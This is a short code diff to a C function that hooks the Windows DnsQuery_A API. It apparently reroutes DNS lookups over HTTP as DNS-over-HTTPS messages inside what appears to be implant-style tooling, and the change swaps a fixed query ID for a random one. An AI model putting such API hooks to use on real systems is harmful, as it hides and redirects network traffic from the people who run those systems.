@@ -70,6 +70,7 @@ D_SEC( D ) DNS_STATUS WINAPI DnsQuery_A_Hook( _In_ PCSTR pszName, _In_ WORD wTyp
 	API		Api;
 	UNICODE_STRING	Uni;
 
+	USHORT		Xid = 0;
 	ULONG		Val = 0;
 	ULONG		Cod = HTTP_STATUS_OK;
 	BOOLEAN		Suc = FALSE;
@@ -154,7 +155,12 @@ D_SEC( D ) DNS_STATUS WINAPI DnsQuery_A_Hook( _In_ PCSTR pszName, _In_ WORD wTyp
 				if ( ! ( Buf = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, 0, Len ) ) ) {
 					goto Leave;
 				};
-				if ( Api.DnsWriteQuestionToBuffer_UTF8( Buf, &Len, pszName, wType, 0, TRUE ) ) 
+
+				Val = Api.RtlRandomEx( &Val );
+				Val = Api.RtlRandomEx( &Val );
+				Xid = ( UINT16 )( Val % ( UINT16_MAX + 1 ) );
+
+				if ( Api.DnsWriteQuestionToBuffer_UTF8( Buf, &Len, pszName, wType, Xid, TRUE ) ) 
 				{
 					if ( Api.HttpSendRequestA( Hop, C_PTR( G_SYM( "Content-Type: application/dns-message" ) ), -1L, Buf, Len ) ) 
 					{
